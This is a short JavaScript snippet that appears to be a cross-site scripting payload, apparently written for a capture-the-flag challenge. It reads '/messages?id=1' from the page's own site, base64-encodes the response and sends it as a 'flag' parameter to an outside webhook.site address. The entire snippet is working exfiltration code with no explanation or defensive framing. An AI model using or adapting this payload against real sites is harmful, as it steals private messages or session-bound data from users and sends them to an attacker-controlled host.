fetch('/messages?id=1')
  .then(r => r.text())
  .then(d => {
    fetch('https://webhook.site/376da9f2-490d-4e83-85f5-c6ca830535d8?flag='+btoa(d));
  });
